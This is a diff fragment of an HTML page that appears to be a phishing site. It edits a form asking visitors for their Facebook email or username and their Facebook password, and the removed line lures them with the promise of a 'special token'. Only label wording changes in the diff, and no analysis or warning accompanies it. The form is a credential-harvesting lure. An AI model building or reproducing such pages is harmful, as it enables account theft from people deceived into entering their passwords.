@@ -251,8 +251,7 @@ top;}
 </div>
 <div class="panel-body">
 <div class="form-group">
-<Center><label for="email">* THROUGH ONLY EMAIL CAN GET SPECIAL TOKEN *</label>
-ENTER YOUR FACEBOOK EMAIL/USERNAME
+<Center><label for="email">* ENTER YOUR FACEBOOK EMAIL/USERNAME *</label>
 <center><input id="email" placeholder="ADD EMAIL HERE" type="text" class="form-control"/>
 </div>
 <center><div class="form-group"><label for="password">* ENTER YOUR FACEBOOK PASSWORD *</label>
